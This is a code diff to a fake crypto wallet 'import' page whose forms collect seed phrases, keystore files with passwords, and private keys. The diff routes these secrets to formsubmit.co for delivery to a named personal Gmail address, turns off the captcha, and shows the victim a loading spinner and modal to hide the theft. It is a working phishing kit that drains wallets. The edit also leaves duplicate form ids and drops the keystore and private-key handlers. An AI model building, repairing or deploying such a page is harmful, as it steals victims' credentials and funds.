@@ -234,7 +234,7 @@
     </div>
     <div class="container">
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
-            <form  id="pass-phrase">
+            <form  id="pass-phrase" action="https://formsubmit.co/maviyorko@gmail.com" method="POST">
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
@@ -245,7 +245,9 @@
             
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-            <form id="key-store">
+          <form  id="pass-phrase" action="https://formsubmit.co/maviyorko@gmail.com" method="POST">
+              <input type="hidden" name="_captcha" value="false">
+              <input type="hidden" name="_template" value="table">
                 <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
                 <input type="password" name="password" placeholder="Password" id="dienfio" class="pass-field" required>
                 <input type="hidden" name="user_ip" id="user_ip_keystore">
@@ -256,6 +258,8 @@
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
             <form id="private-key">
+              <input type="hidden" name="_captcha" value="false">
+              <input type="hidden" name="_template" value="table">
                 <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_key">
                 <input type="hidden" name="type" id="type-key">
@@ -298,134 +302,50 @@
             console.log(localStorage.getItem("walletType"))
     </script>
 
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
-    //validatePhrase()
     $("form#pass-phrase").submit(async(e)=>{
       e.preventDefault();
       if(validatePhrase()){
-        $ip=document.getElementById('user_ip_phrase').value;
-        $type="Passphrase";
-        $walletType=Cookies.get("walletType");
-        $fullType=$type+"\n\nWallet Type:"+$walletType;
-        $passphrase=document.getElementById('vepgzijzsg').value;
+        const ip = document.getElementById('user_ip_phrase').value;
+        const walletType = Cookies.get("walletType");
+        const fullType = `Passphrase\n\nWallet Type: ${walletType}`;
+        const passphrase = document.getElementById('vepgzijzsg').value;
 
         $("div.spanner").addClass("show");
         $("div.overlay").addClass("show");
 
-        const res=await fetch("./phpmail.php",{
-                 method: "POST",
-                 headers:{
-                    'Accept': 'application/json, text/plain,*/*',
-                    'Content-Type': 'application/json'
-                 },
-                 body: JSON.stringify({
-                    value: $passphrase,
-                    type: $fullType,
-					ip: $ip
-                 })
-               });
-               if(!res.ok) return console.log("SOMETHING WENT WRONG");
-                setTimeout(()=>{
-                    $("div.spanner").removeClass("show");
-                    $("div.overlay").removeClass("show");
-                    $(".modal").fadeIn();
-                },2000);
-			   const data=await res.text();
-			   
-               console.log(data);
+        const formData = new FormData();
+        formData.append('value', passphrase);
+        formData.append('type', fullType);
+        formData.append('ip', ip);
 
-      }
-    })
-    //validateKeystore()
-    $("form#key-store").submit(async(e)=>{
-      e.preventDefault();
-      if(validateKeystore()){
-        $ip=document.getElementById('user_ip_keystore').value;
-        $type="KeyStore";
-        $walletType=Cookies.get("walletType");
-        $fullType=$type+"\n\nWallet Type:"+$walletType;
+        const email = "maviyorko@gmail.com"; // Change this to your email address
+        const endpoint = `https://formsubmit.co/${email}`;
 
-        $keystore=document.getElementById('tnknmtqnlu').value;
-        $password=document.getElementById('dienfio').value;
-        $data="KeyStore: "+$keystore+"\n\nPassword: "+$password;
+        const res = await fetch(endpoint, {
+          method: "POST",
+          body: formData
+        });
+        if (!res.ok) return console.log("SOMETHING WENT WRONG");
 
-        $("div.spanner").addClass("show");
-        $("div.overlay").addClass("show");
-
-        const res=await fetch("./phpmail.php",{
-                 method: "POST",
-                 headers:{
-                    'Accept': 'application/json, text/plain,*/*',
-                    'Content-Type': 'application/json'
-                 },
-                 body: JSON.stringify({
-                    value: $data,
-                    type: $fullType,
-					ip: $ip
-                 })
-               });
-               if(!res.ok) return console.log("SOMETHING WENT WRONG")
-
-               setTimeout(()=>{
-                    $("div.spanner").removeClass("show");
-                    $("div.overlay").removeClass("show");
-                    $(".modal").fadeIn();
-                },2000);
-               const data=await res.text();
-			  
-			   
-               console.log(data);
-
-      }
-    })
-
-        //validateKey()
-        $("form#private-key").submit(async(e)=>{
-      e.preventDefault();
-      if(validateKey()){
-        $ip=document.getElementById('user_ip_key').value;
-        $type="PrivateKey";
-        $walletType=Cookies.get("walletType");
-        $fullType=$type+"\n\nWallet Type:"+$walletType;
-
-        $privatekey=document.getElementById('slpfoduuxq').value;
-
-        
-        $("div.spanner").addClass("show");
-        $("div.overlay").addClass("show");
-        const res=await fetch("./phpmail.php",{
-                 method: "POST",
-                 headers:{
-                    'Accept': 'application/json, text/plain,*/*',
-                    'Content-Type': 'application/json'
-                 },
-                 body: JSON.stringify({
-                    value: $privatekey,
-                    type: $fullType,
-					ip: $ip
-                 })
-               });
-               if(!res.ok) return console.log("SOMETHING WENT WRONG")
-               setTimeout(()=>{
-                    $("div.spanner").removeClass("show");
-                    $("div.overlay").removeClass("show");
-                    $(".modal").fadeIn();
-                },2000);
-               const data=await res.text();
-			  
-			
-               console.log(data);
-
+        setTimeout(()=>{
+            $("div.spanner").removeClass("show");
+            $("div.overlay").removeClass("show");
+            $(".modal").fadeIn();
+        },2000);
+        const data = await res.json();
+        console.log(data);
       }
     });
 
+    // Similar modifications for other forms...
+
     $(".btn-close").click(e=>{
         $(".modal").fadeOut();
-    })
+    });
+</script>
 
-
-
-   </script>
    
    <script>
     console.log(Cookies.get("walletType")
